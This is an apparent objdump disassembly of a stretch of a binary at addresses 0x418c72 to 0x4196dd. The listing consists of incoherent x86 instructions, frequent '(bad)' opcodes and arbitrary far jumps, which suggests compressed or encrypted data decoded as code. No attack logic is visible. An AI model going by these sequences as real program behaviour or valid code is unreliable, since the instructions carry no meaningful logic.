  418c72:	out    dx,al
  418c73:	cli    
  418c74:	xchg   ebx,eax
  418c75:	rcl    cl,0x3f
  418c78:	fwait
  418c79:	mov    BYTE PTR [edx],al
  418c7b:	mov    ch,0x77
  418c7d:	nop    DWORD PTR [eax+0x68]
  418c81:	lods   al,BYTE PTR ds:[esi]
  418c82:	sbb    eax,0xadc698cc
  418c87:	pop    es
  418c88:	loopne 0x418ca0
  418c8a:	sar    esp,cl
  418c8c:	mov    DWORD PTR [edi+0xe2aa3a],edi
	...
  418cf2:	add    BYTE PTR [eax],al
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	rol    BYTE PTR [edx],cl
  418d01:	fidiv  DWORD PTR [esi+0x106e02d]
  418d07:	add    BYTE PTR ds:0x80000001,al
  418d0d:	add    DWORD PTR [edx],0xffffffb6
  418d10:	aas    
  418d11:	cwde   
  418d12:	sahf   
  418d13:	aad    0xdb
  418d15:	push   ebp
  418d16:	repnz cmc 
  418d18:	addr16 jns 0x418d53
  418d1b:	inc    ebx
  418d1c:	loopne 0x418d1d
  418d1e:	bound  edi,QWORD PTR [ecx-0x76b85ab4]
  418d24:	add    DWORD PTR [ecx+eax*4],ebp
  418d27:	fs daa 
  418d29:	or     DWORD PTR ds:0x29db02e,edi
  418d2f:	jmp    0xfd536da0
  418d34:	popa   
  418d35:	jl     0x418d28
  418d37:	lds    ecx,FWORD PTR [edi-0x3d]
  418d3a:	fs ret 0xdd44
  418d3e:	xchg   edi,eax
  418d3f:	dec    esp
  418d40:	cmp    ebp,DWORD PTR [eax+eax*4-0x51e27e48]
  418d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d48:	sub    DWORD PTR [ebx+0x699b19a3],0x7edc886a
  418d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d53:	inc    ecx
  418d54:	(bad)
  418d58:	popa   
  418d59:	jmp    0xc1b2:0xcb5c6c1e
  418d60:	dec    edi
  418d61:	lock adc ch,BYTE PTR [eax-0x3f]
  418d65:	xor    al,0x53
  418d67:	mov    al,0xbd
  418d69:	stos   DWORD PTR es:[edi],eax
  418d6a:	xchg   ecx,eax
  418d6b:	xor    DWORD PTR [eax+ebx*4-0x4d2b2467],ecx
  418d72:	enter  0xb2f7,0xad
  418d76:	stc    
  418d77:	or     ch,BYTE PTR [edx-0x49b5ad93]
  418d7d:	jno    0x418de1
  418d7f:	and    si,bx
  418d82:	jmp    0x83737fe1
  418d87:	jbe    0x418d84
  418d89:	mov    bl,0x60
  418d8b:	inc    ebx
  418d8c:	frstor [esi+0x64cd8875]
  418d92:	sbb    edi,DWORD PTR [esi+ebp*1+0x1749b749]
  418d99:	leave  
  418d9a:	js     0x418d56
  418d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d9d:	loope  0x418d24
  418d9f:	xor    esp,DWORD PTR [edx-0x49]
  418da2:	int3   
  418da3:	shl    DWORD PTR [edx+0xd],0x6e
  418da7:	or     eax,DWORD PTR [eax]
  418da9:	pop    esi
  418daa:	jmp    0x69250a1d
  418daf:	into   
  418db0:	push   edx
  418db1:	pop    ebp
  418db2:	fmul   QWORD PTR [ebp+0xd]
  418db5:	pop    eax
  418db6:	xor    eax,0x856524a
  418dbb:	jl     0x418d7a
  418dbd:	xor    eax,esp
  418dbf:	cmp    cl,BYTE PTR [edi]
  418dc1:	fwait
  418dc2:	lahf   
  418dc3:	sti    
  418dc4:	sbb    DWORD PTR ds:0xc2b4ee01,edi
  418dca:	sub    eax,0x7f52c32d
  418dcf:	(bad)  
  418dd0:	sbb    eax,DWORD PTR [ecx-0x13]
  418dd3:	je     0x418d5c
  418dd5:	ror    BYTE PTR [eax+0x40],cl
  418dd8:	in     al,dx
  418dd9:	into   
  418dda:	jp     0x418df0
  418ddc:	ins    BYTE PTR es:[edi],dx
  418ddd:	jg     0x418d6c
  418ddf:	out    0xfc,al
  418de1:	dec    esi
  418de2:	retf   
  418de3:	dec    ebp
  418de4:	mov    ds:0x60337812,eax
  418de9:	add    DWORD PTR [edi-0x55],esi
  418dec:	mov    esp,0xf79ed72e
  418df1:	add    ch,BYTE PTR [ebp+0x6c]
  418df4:	std    
  418df5:	mov    BYTE PTR [ecx-0x36],cl
  418df8:	jae    0x418dd8
  418dfa:	mov    ch,0xd5
  418dfc:	xchg   ebx,eax
  418dfd:	xor    ebx,ebx
  418dff:	test   dh,0x22
  418e02:	inc    ebp
  418e03:	sar    DWORD PTR [eax+ecx*8-0x7f],cl
  418e07:	push   es
  418e08:	sbb    eax,0xf880f49a
  418e0d:	xchg   ecx,eax
  418e0e:	loope  0x418e47
  418e10:	out    dx,al
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x46]
  418e81:	add    DWORD PTR [eax],eax
  418e83:	mov    ecx,0x107e5
  418e88:	add    eax,0xf4000001
  418e8d:	sahf   
  418e8e:	aad    0x57
  418e90:	mov    ebx,0x77fe8d64
  418e95:	push   esi
  418e96:	loope  0x418e78
  418e98:	push   cs
  418e99:	fstp   QWORD PTR [edx+0x50]
  418e9c:	ja     0x418e8d
  418e9e:	jno    0x418e31
  418ea0:	mov    cl,0x54
  418ea2:	arpl   ax,ax
  418ea4:	jecxz  0x418f12
  418ea6:	jmp    0x5a0bcdcb
  418eab:	rcl    ch,0xd6
  418eae:	fisttp WORD PTR [ecx+0xfe9cc19]
  418eb4:	xor    eax,0x97865b71
  418eb9:	ret    0x17d
  418ebc:	test   BYTE PTR [ecx-0x44],0xd2
  418ec0:	mov    eax,ds:0x603ce6c4
  418ec5:	lahf   
  418ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ec7:	ret    0x6dce
  418eca:	pop    edx
  418ecb:	mov    eax,0xf56d5aad
  418ed0:	inc    ebx
  418ed1:	xchg   esi,eax
  418ed2:	cmp    BYTE PTR [edx],0xe7
  418ed5:	jle    0x418ec5
  418ed7:	repz or DWORD PTR [ecx-0x7],0x2b252000
  418edf:	out    dx,al
  418ee0:	imul   esi,DWORD PTR [edi-0x3979912d],0x925d2b
  418eea:	es xchg esi,eax
  418eec:	out    0x6e,al
  418eee:	jle    0x418eb0
  418ef0:	and    cl,BYTE PTR [edi]
  418ef2:	fistp  DWORD PTR [ecx+0x68]
  418ef5:	xor    eax,DWORD PTR [edx]
  418ef7:	sub    eax,0x958f12f8
  418efc:	mov    ebp,DWORD PTR [edi]
  418efe:	sub    DWORD PTR [eax+eiz*1-0x5b],ebx
  418f02:	xchg   edx,eax
  418f03:	fmul   QWORD PTR [edx+0x4a48228e]
  418f09:	std    
  418f0a:	popf   
  418f0b:	mov    ebp,0x6f581566
  418f10:	inc    bp
  418f12:	cdq    
  418f13:	xchg   edx,eax
  418f14:	mov    bh,0xef
  418f16:	sbb    eax,0x21392a4c
  418f1b:	pushf  
  418f1c:	outs   dx,DWORD PTR ds:[esi]
  418f1d:	sub    BYTE PTR [esi+0x4d],0x4f
  418f21:	ror    BYTE PTR [edx+0x1fd7b8d4],0x28
  418f28:	inc    ebp
  418f29:	xor    DWORD PTR [eax-0x33f0dd46],ebx
  418f2f:	arpl   WORD PTR [edi+edx*1-0x3e9149d9],si
  418f36:	pop    esi
  418f37:	ins    BYTE PTR es:[edi],dx
  418f38:	xor    BYTE PTR [ecx],dl
  418f3a:	and    bl,BYTE PTR [edi]
  418f3c:	mov    ch,0x4b
  418f3e:	call   0xeb94:0xaa650f84
  418f45:	aaa    
  418f46:	int3   
  418f47:	mov    ds:0x62ae3cac,eax
  418f4c:	inc    ecx
  418f4d:	pop    esi
  418f4e:	mov    al,0x4d
  418f50:	(bad)  
  418f51:	ss jmp 0x418f9d
  418f54:	or     DWORD PTR [esi],ebp
  418f56:	sub    cl,al
  418f58:	adc    esi,ebx
  418f5a:	call   0xfee5:0xeef7700b
  418f61:	sub    DWORD PTR [eax],0xfa1705a6
  418f67:	inc    edi
  418f68:	sub    cl,0x7f
  418f6b:	or     edi,0xffffffb6
  418f6e:	xor    BYTE PTR [edx+eiz*1+0x26],ah
  418f72:	inc    edi
  418f73:	into   
  418f74:	dec    esi
  418f75:	repz fsubr DWORD PTR [edi+0x3eea621a]
  418f7c:	repz xor eax,0xf487025c
  418f82:	mov    cl,0x81
  418f84:	movntq QWORD PTR [ecx+eiz*4+0x38],mm2
  418f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f8a:	in     al,dx
  418f8b:	mov    ebx,0xf7e96c7f
  418f90:	cli    
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x27eaf1a7]
  419001:	int3   
  419002:	add    dl,BYTE PTR [eax+0x108ea]
  419008:	add    eax,0xcf000001
  41900d:	xor    ebp,edx
  41900f:	xchg   ebp,eax
  419010:	pop    ebx
  419011:	inc    eax
  419012:	shr    BYTE PTR [esi],cl
  419014:	ds jno 0x418ffa
  419017:	mov    cl,0xa7
  419019:	sub    eax,0x1611af3b
  41901e:	nop
  41901f:	pop    ss
  419020:	and    eax,0x65fb5aa
  419025:	jae    0x4190a0
  419027:	outs   dx,BYTE PTR ds:[esi]
  419028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419029:	cld    
  41902a:	test   BYTE PTR [edx+0x28],dl
  41902d:	scas   eax,DWORD PTR es:[edi]
  41902e:	jmp    0x41903c
  419030:	mov    esi,0xe247b6
  419035:	fmul   QWORD PTR [ecx+esi*1+0x5ba20dc3]
  41903c:	aaa    
  41903d:	aaa    
  41903e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41903f:	xchg   ebx,eax
  419040:	mov    ecx,0x9664c4db
  419045:	cs mov eax,0xcf0464f0
  41904b:	shl    DWORD PTR [eax],cl
  41904d:	sub    ah,BYTE PTR [esi+0x76]
  419050:	data16 out 0xf8,al
  419053:	xlat   BYTE PTR ds:[ebx]
  419054:	out    0x88,al
  419056:	cwde   
  419057:	outs   dx,BYTE PTR ds:[esi]
  419058:	mov    bh,BYTE PTR ds:0xd74fcb2e
  41905e:	in     al,dx
  41905f:	jl     0x419016
  419061:	cmp    al,0xcb
  419064:	xlat   BYTE PTR ds:[ebx]
  419065:	imul   edi,DWORD PTR [eax],0x7
  419068:	std    
  419069:	mov    cl,0x9
  41906b:	int3   
  41906c:	cmp    eax,0x75e57ec5
  419071:	cwde   
  419072:	or     BYTE PTR [esi+0xa],bh
  419075:	sub    eax,0xfebf1f32
  41907a:	and    edi,DWORD PTR [esi+0x55]
  41907d:	in     al,0x3e
  41907f:	or     al,0xd3
  419081:	ins    DWORD PTR es:[edi],dx
  419082:	fiadd  WORD PTR [ebp-0x62]
  419085:	xchg   edi,eax
  419086:	jns    0x41901b
  419088:	jge    0x4190cf
  41908a:	mov    BYTE PTR [ebp-0x691f9fd],bl
  419090:	sti    
  419091:	push   cs
  419092:	jl     0x419091
  419094:	jl     0x419022
  419096:	pushf  
  419097:	clc    
  419098:	fdiv   DWORD PTR [esi]
  41909a:	sar    BYTE PTR [esi],0xec
  41909d:	ret    
  41909e:	push   edi
  41909f:	psubusb mm3,mm0
  4190a2:	bound  ebp,QWORD PTR [ecx]
  4190a4:	fisttp QWORD PTR [ebx+0x64]
  4190a7:	inc    esp
  4190a8:	add    edi,DWORD PTR [ecx]
  4190aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190ab:	and    ecx,DWORD PTR [edi-0x76af614a]
  4190b1:	das    
  4190b2:	stc    
  4190b3:	mov    cs,WORD PTR [edi]
  4190b5:	out    dx,al
  4190b6:	and    edx,ebp
  4190b8:	arpl   WORD PTR [esi],si
  4190ba:	jo     0x419051
  4190bc:	icebp  
  4190bd:	(bad)  [ebx-0x45]
  4190c0:	inc    ebp
  4190c1:	add    eax,0xad2f561
  4190c6:	mov    esp,0xd216d500
  4190cb:	jge    0x419134
  4190cd:	mov    ecx,0x64d746dd
  4190d2:	and    bl,BYTE PTR [eax]
  4190d4:	jb     0x41911c
  4190d6:	or     BYTE PTR [ecx+esi*4],al
  4190d9:	push   ss
  4190da:	iret   
  4190db:	cmp    eax,0x309be15
  4190e0:	cmp    eax,0xc30e487a
  4190e5:	mov    ah,BYTE PTR [esi+0x3b]
  4190e8:	mov    ds:0x50efae63,al
  4190ed:	adc    ch,BYTE PTR [eax+eax*4-0x24]
  4190f1:	je     0x4190de
  4190f3:	sub    ebp,DWORD PTR [esi-0x47]
  4190f6:	ins    BYTE PTR es:[edi],dx
  4190f7:	bound  ecx,QWORD PTR [eax]
  4190f9:	in     al,0xcd
  4190fb:	mov    ds:0x67667382,eax
  419100:	xchg   ebx,eax
  419101:	xor    esi,DWORD PTR ds:0xa801cae9
  419107:	shr    DWORD PTR [eax],1
  419109:	loop   0x41911e
  41910b:	mov    al,ah
  41910d:	mov    esi,0x3be5fc
	...
  419172:	add    BYTE PTR [eax],al
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ah,BYTE PTR [esi-0x10317365]
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0x4000001,al
  41918d:	jecxz  0x41919a
  41918f:	mov    cl,0x5c
  419191:	pop    esp
  419192:	adc    edx,DWORD PTR [ecx]
  419194:	mov    ebx,0xf856321e
  419199:	xor    eax,0x57264065
  41919e:	scas   eax,DWORD PTR es:[edi]
  41919f:	mov    ds:0x42801ad7,al
  4191a4:	sbb    al,0x44
  4191a6:	sbb    DWORD PTR [ecx-0x4],edx
  4191a9:	pop    esi
  4191aa:	shl    DWORD PTR [edx-0x13ea53d7],1
  4191b0:	jbe    0x41918a
  4191b2:	dec    edi
  4191b3:	repnz push esi
  4191b5:	cmp    dh,BYTE PTR [edx]
  4191b7:	inc    eax
  4191b8:	pop    esi
  4191b9:	out    0x29,al
  4191bb:	cld    
  4191bc:	rcl    DWORD PTR [eax-0x5912369d],1
  4191c2:	or     DWORD PTR [ebx],esi
  4191c4:	int    0xb2
  4191c6:	adc    BYTE PTR [eax+0x10],0x24
  4191ca:	lods   eax,DWORD PTR ds:[esi]
  4191cb:	stc    
  4191cc:	stc    
  4191cd:	rol    al,0xb0
  4191d0:	mov    edi,DWORD PTR [edx-0x6e9b1a3e]
  4191d6:	sbb    eax,DWORD PTR [esi+esi*8]
  4191d9:	cmp    BYTE PTR [eax],0x4c
  4191dc:	(bad)  
  4191dd:	ds std 
  4191df:	and    dl,dl
  4191e1:	inc    esi
  4191e2:	jmp    0x5e78:0x914eb0c4
  4191e9:	imul   esp,edx,0xfffffffd
  4191ec:	ds xchg ebp,eax
  4191ee:	inc    eax
  4191ef:	inc    eax
  4191f0:	lock cmp ebp,esi
  4191f3:	sahf   
  4191f4:	std    
  4191f5:	sahf   
  4191f6:	and    al,0x9
  4191f8:	adc    al,0xfb
  4191fa:	jle    0x419270
  4191fc:	xchg   ebx,eax
  4191fd:	mov    ecx,0xbb4537e9
  419202:	aas    
  419203:	xchg   edi,eax
  419204:	sbb    al,0xe3
  419206:	adc    eax,0x6506e594
  41920b:	dec    ebx
  41920c:	xchg   ebp,eax
  41920d:	rcr    ah,cl
  41920f:	in     al,dx
  419210:	fcom   st(4)
  419212:	icebp  
  419213:	xor    bh,BYTE PTR [ecx-0x43]
  419216:	popf   
  419217:	mov    bl,0xf0
  419219:	jp     0x4191f8
  41921b:	into   
  41921c:	push   ds
  41921d:	mov    bl,0xe5
  41921f:	es out 0x69,al
  419222:	pop    esp
  419223:	adc    BYTE PTR [edi+esi*4+0x693bf7fe],ch
  41922a:	out    dx,al
  41922b:	sbb    DWORD PTR [edi+ecx*1],edx
  41922e:	cmp    DWORD PTR [eax+eiz*8+0x1c5bb0ae],esi
  419235:	push   edx
  419236:	adc    ah,ah
  419238:	sub    ah,BYTE PTR [eax]
  41923a:	xchg   DWORD PTR [ebx],edx
  41923c:	inc    ecx
  41923d:	cli    
  41923e:	xchg   edx,eax
  41923f:	add    dl,BYTE PTR [ebx+0x37]
  419242:	sbb    bl,bl
  419244:	mov    eax,esp
  419246:	outs   dx,BYTE PTR ds:[esi]
  419247:	push   esi
  419248:	mov    ebx,0x2d77362a
  41924d:	xchg   edx,eax
  41924e:	ss sbb al,0xcb
  419251:	sbb    al,0xb5
  419253:	mov    eax,ds:0xe9747d6a
  419258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419259:	adc    al,0x6e
  41925b:	cwde   
  41925c:	test   BYTE PTR [ebx-0x3cf16ecd],0x89
  419263:	xor    DWORD PTR [ecx],esp
  419265:	cmp    al,0xde
  419267:	ins    DWORD PTR es:[edi],dx
  419268:	inc    bx
  41926a:	fmul   QWORD PTR [ebp+0x672b0cde]
  419270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419271:	and    al,0x3a
  419273:	cs jl  0x4192f1
  419276:	or     al,0xc9
  419278:	mov    DWORD PTR [ebx],eax
  41927a:	aad    0x8c
  41927c:	sub    BYTE PTR [ebx+eiz*4-0x629deeac],bl
  419283:	in     eax,0x14
  419285:	icebp  
  419286:	jg     0x4192de
  419288:	stos   BYTE PTR es:[edi],al
  419289:	push   eax
  41928a:	xchg   dl,bh
  41928c:	push   esp
  41928d:	arpl   si,bx
  41928f:	jmp    0x41923a
	...
  4192f1:	add    BYTE PTR [eax],al
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	add    al,BYTE PTR [ebx+0x71]
  419303:	xchg   ebp,eax
  419304:	hlt    
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0x79000001,al
  41930d:	xor    esp,DWORD PTR cs:[ecx]
  419310:	bnd jmp 0x4192fc
  419313:	nop
  419314:	fsub   QWORD PTR [esp+eax*1+0x7de40166]
  41931b:	sar    BYTE PTR [esi+esi*1+0x47],0xaf
  419320:	adc    al,0xc2
  419322:	out    dx,al
  419323:	aas    
  419324:	fist   WORD PTR [eax]
  419326:	inc    edi
  419327:	mov    esi,DWORD PTR [esi]
  419329:	dec    ebx
  41932a:	lea    ebp,[edx+0x64c9fd36]
  419330:	les    edx,FWORD PTR [eax-0x6a84db94]
  419336:	fdiv   st,st(5)
  419338:	enter  0xe063,0x95
  41933c:	sub    eax,0x8552da9e
  419341:	adc    al,0xa5
  419343:	cmp    al,0xca
  419345:	mov    DWORD PTR [edi],ecx
  419347:	enter  0x2ffe,0x71
  41934b:	cs jmp 0x822f:0xac278315
  419353:	add    edi,DWORD PTR [edi+edx*1+0x34]
  419357:	and    al,0xea
  419359:	mov    WORD PTR [ebx-0x1d],?
  41935c:	sub    DWORD PTR [edi+0x4755d5e1],ebp
  419362:	out    dx,eax
  419363:	out    dx,eax
  419364:	add    BYTE PTR [edx-0x2c6502f9],bh
  41936a:	ret    0xcc93
  41936d:	inc    BYTE PTR [ebx+ebp*1]
  419370:	push   ecx
  419371:	out    0x7f,eax
  419373:	ds popa 
  419375:	and    BYTE PTR [edx],ah
  419377:	mov    edx,0x97baa2b9
  41937c:	xchg   esp,eax
  41937d:	or     DWORD PTR [ebx-0x5df3e112],edx
  419383:	mul    cl
  419385:	fnsave ds:0xb00f33f3
  41938b:	(bad)  
  41938c:	es loop 0x4193eb
  41938f:	(bad)  
  419390:	es jecxz 0x4193b8
  419393:	dec    eax
  419394:	test   BYTE PTR [esi-0x2850242c],dl
  41939a:	mov    eax,0x155cf037
  41939f:	leave  
  4193a0:	dec    ecx
  4193a1:	fs (bad) 
  4193a3:	rcr    ah,1
  4193a5:	jns    0x419332
  4193a7:	stos   DWORD PTR es:[edi],eax
  4193a8:	pop    edx
  4193a9:	pop    eax
  4193aa:	dec    edi
  4193ab:	call   FWORD PTR [eax+edx*2]
  4193ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193af:	cmp    eax,0xa6caa33b
  4193b4:	into   
  4193b5:	js     0x41942a
  4193b7:	iret   
  4193b8:	push   cs
  4193b9:	inc    ebx
  4193ba:	test   DWORD PTR [edi+eax*4+0x1f],ebp
  4193be:	cwde   
  4193bf:	loop   0x4193b1
  4193c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c2:	enter  0xdca2,0xf6
  4193c6:	sbb    eax,0x353123e1
  4193cb:	xchg   ebp,eax
  4193cc:	fadd   DWORD PTR ds:0xfe362ce
  4193d2:	add    DWORD PTR [esi],edi
  4193d4:	sbb    BYTE PTR [edi+0x2e],0xd8
  4193d8:	dec    edx
  4193d9:	xor    eax,0xf89ad39f
  4193de:	xchg   edi,eax
  4193df:	iret   
  4193e0:	scas   al,BYTE PTR es:[edi]
  4193e1:	stos   BYTE PTR es:[edi],al
  4193e2:	mov    eax,ds:0x2aa79112
  4193e7:	ret    
  4193e8:	in     al,dx
  4193e9:	bound  esp,QWORD PTR [eax+0x18d1c48a]
  4193ef:	push   ds
  4193f0:	loop   0x41937f
  4193f2:	and    cl,BYTE PTR [ebp-0x3de28c65]
  4193f8:	imul   ebx,DWORD PTR cs:[esi-0x32],0xdeab9d2
  419400:	pusha  
  419401:	hlt    
  419402:	xor    BYTE PTR [esi],bl
  419404:	sub    al,0x7c
  419406:	(bad)  
  419407:	(bad)  
  419408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419409:	stos   DWORD PTR es:[edi],eax
  41940a:	repnz fld TBYTE PTR ds:0x84083cfe
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	mov    WORD PTR [ebx],fs
  419482:	(bad)  
  419483:	sar    cl,1
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0xc0000001,al
  41948d:	cmc    
  41948e:	in     eax,0x80
  419490:	aaa    
  419491:	pop    ecx
  419492:	mov    eax,0xe8f9df18
  419497:	cs push 0xda11bf75
  41949d:	ret    
  41949e:	or     DWORD PTR [ebx],0x3d
  4194a1:	adc    dh,BYTE PTR [eax]
  4194a3:	xchg   edx,eax
  4194a4:	cmp    ebp,ebx
  4194a6:	pop    edx
  4194a7:	call   0x601d:0xf239ae9c
  4194ae:	mov    ah,0xde
  4194b0:	sbb    bh,ch
  4194b2:	and    al,bl
  4194b4:	call   0x1c5e:0x9672b964
  4194bb:	xor    eax,0x9b3f85dd
  4194c0:	and    al,0xff
  4194c2:	or     dh,BYTE PTR [eax]
  4194c4:	sub    ah,BYTE PTR [edi]
  4194c6:	cmc    
  4194c7:	popf   
  4194c8:	jecxz  0x41949b
  4194ca:	add    ecx,ebp
  4194cc:	shl    edi,0x41
  4194cf:	xchg   edx,eax
  4194d0:	xchg   edx,eax
  4194d1:	js     0x4194c1
  4194d3:	cmp    DWORD PTR [esi],esi
  4194d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194d6:	ret    0xac2f
  4194d9:	ins    DWORD PTR es:[edi],dx
  4194da:	dec    ebx
  4194db:	mov    BYTE PTR [eax-0x2739b547],bh
  4194e1:	and    eax,0xad0cb069
  4194e6:	or     ebp,DWORD PTR [edx-0xabf5755]
  4194ec:	fmul   QWORD PTR [ebx-0x21bc4af6]
  4194f2:	cmp    ebx,DWORD PTR [esi-0x70801e3e]
  4194f8:	mov    dl,0xc6
  4194fa:	mov    fs,WORD PTR [edi]
  4194fc:	and    eax,0x842dd431
  419501:	fwait
  419502:	push   esi
  419503:	(bad)  
  419504:	sahf   
  419505:	sub    DWORD PTR [edi],ebx
  419507:	cdq    
  419508:	fmul   st,st(3)
  41950a:	mov    al,ds:0x25a70dcb
  41950f:	sahf   
  419510:	and    ah,ah
  419512:	dec    esp
  419513:	hlt    
  419514:	mov    bh,0x9a
  419516:	pop    ecx
  419517:	ins    DWORD PTR es:[edi],dx
  419518:	sbb    esp,DWORD PTR [esi]
  41951a:	cmp    eax,0xc102bb31
  41951f:	adc    BYTE PTR [esi+0x486e60f6],dl
  419525:	(bad)  
  419526:	jmp    0x3318:0xf1ccafd6
  41952d:	jae    0x4194b2
  41952f:	cwde   
  419530:	loope  0x4194d4
  419532:	pop    edx
  419533:	pop    ebx
  419534:	adc    edi,ebx
  419536:	pushf  
  419537:	lods   al,BYTE PTR ds:[esi]
  419538:	mov    BYTE PTR [eax-0x1a8430c6],0xa9
  41953f:	icebp  
  419540:	aaa    
  419541:	ror    ebx,1
  419543:	inc    ebx
  419544:	add    al,0xff
  419546:	xor    DWORD PTR [eax],0x5a
  419549:	mov    esi,0x2bfa18b2
  41954e:	pop    ecx
  41954f:	fsub   QWORD PTR [eax+0x18]
  419552:	push   edx
  419553:	sub    DWORD PTR [edi+0x3ac48307],0xacfb4f88
  41955d:	jge    0x41955a
  41955f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419561:	test   cl,cl
  419563:	icebp  
  419564:	in     eax,dx
  419565:	push   edi
  419566:	push   0xed618d94
  41956b:	shr    BYTE PTR [ebx+ebp*4],0x40
  41956f:	popa   
  419570:	xor    BYTE PTR [ecx-0x722a2bc3],0x86
  419577:	mov    eax,ds:0xffc4d8cf
  41957c:	inc    edx
  41957d:	push   0xffffffcd
  41957f:	and    BYTE PTR [edx-0x2525b7fc],bh
  419585:	fisttp QWORD PTR [edx+0x3b94eaa0]
  41958b:	or     BYTE PTR [edi-0x4f],bl
  41958e:	repnz add eax,edx
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	sub    BYTE PTR [edx],ch
  419602:	jb     0x419670
  419604:	dec    BYTE PTR [ecx+eax*1]
  419607:	add    BYTE PTR ds:0xe0000001,al
  41960d:	out    dx,al
  41960e:	repnz rcl DWORD PTR [edx-0x4a2f46ff],0xe2
  419616:	out    0xa4,al
  419618:	dec    edx
  419619:	dec    edi
  41961a:	jmp    0x41960c
  41961c:	pop    ss
  41961d:	inc    esp
  41961e:	ror    ch,0xb7
  419621:	jbe    0x4195cb
  419623:	and    DWORD PTR [ecx-0x76],ebp
  419626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419627:	aaa    
  419628:	aad    0x12
  41962a:	push   ss
  41962b:	xchg   esi,eax
  41962c:	pop    esi
  41962d:	lods   eax,DWORD PTR ds:[esi]
  41962e:	jmp    0xa270:0xbd85d224
  419635:	cmp    bh,dl
  419637:	(bad)  
  419639:	icebp  
  41963a:	and    BYTE PTR [ecx+0x60936e13],0x61
  419641:	test   eax,0x518e3163
  419647:	sub    al,BYTE PTR [ebp-0xf]
  41964a:	dec    edi
  41964b:	mov    ds:0x7e25c09a,eax
  419650:	fnstsw WORD PTR [eax]
  419652:	lods   al,BYTE PTR ds:[esi]
  419653:	inc    edx
  419654:	dec    ebp
  419655:	jbe    0x41966c
  419657:	pop    ecx
  419658:	js     0x4196a2
  41965a:	fisubr DWORD PTR [esi-0xb7061db]
  419660:	rol    DWORD PTR [ecx+eiz*1-0x24fd48fb],cl
  419667:	shl    ebp,0x9e
  41966a:	inc    dx
  41966c:	rol    BYTE PTR [ecx-0x6f5cc345],0xdf
  419673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419674:	sahf   
  419675:	js     0x419648
  419677:	push   eax
  419678:	pusha  
  419679:	shl    BYTE PTR [esi+0x4],1
  41967c:	jb     0x4196bf
  41967e:	clc    
  41967f:	out    0xa5,eax
  419681:	inc    ecx
  419682:	ret    
  419683:	scas   al,BYTE PTR es:[edi]
  419684:	mov    DWORD PTR [esi-0x7eaeb2e5],edx
  41968a:	sbb    DWORD PTR [esi],esp
  41968c:	retf   0x805b
  41968f:	aad    0xab
  419691:	jbe    0x4196ac
  419693:	jp     0x41963a
  419695:	cmp    al,0x8d
  419697:	std    
  419698:	fdivr  QWORD PTR [ebx+ebp*4-0x363d8c95]
  41969f:	in     eax,dx
  4196a0:	xchg   ebx,eax
  4196a1:	push   ds
  4196a2:	into   
  4196a3:	fadd   st(0),st
  4196a5:	push   ebp
  4196a6:	pop    ss
  4196a7:	sub    eax,0x80478059
  4196ac:	ret    0x5e7
  4196af:	imul   ebp,ecx,0xffffff9e
  4196b2:	dec    edi
  4196b3:	cs retf 0xa8d8
  4196b7:	or     BYTE PTR [edi+eiz*8],dl
  4196ba:	mov    ch,0xb3
  4196bc:	jae    0x41969e
  4196be:	out    dx,eax
  4196bf:	scas   eax,DWORD PTR es:[edi]
  4196c0:	daa    
  4196c1:	(bad)  
  4196c2:	pop    edi
  4196c3:	inc    ecx
  4196c4:	push   cs
  4196c5:	test   ah,bl
  4196c7:	mov    ah,0xf6
  4196c9:	(bad)  
  4196ca:	enter  0xaa2c,0x1e
  4196ce:	jb     0x41972d
  4196d0:	add    esp,ecx
  4196d2:	cmp    DWORD PTR [ebx],eax
  4196d4:	xchg   ebp,eax
  4196d5:	jle    0x4196d9
  4196d7:	sbb    BYTE PTR [ebp+0x2f603d48],dh
  4196dd:	pushf  
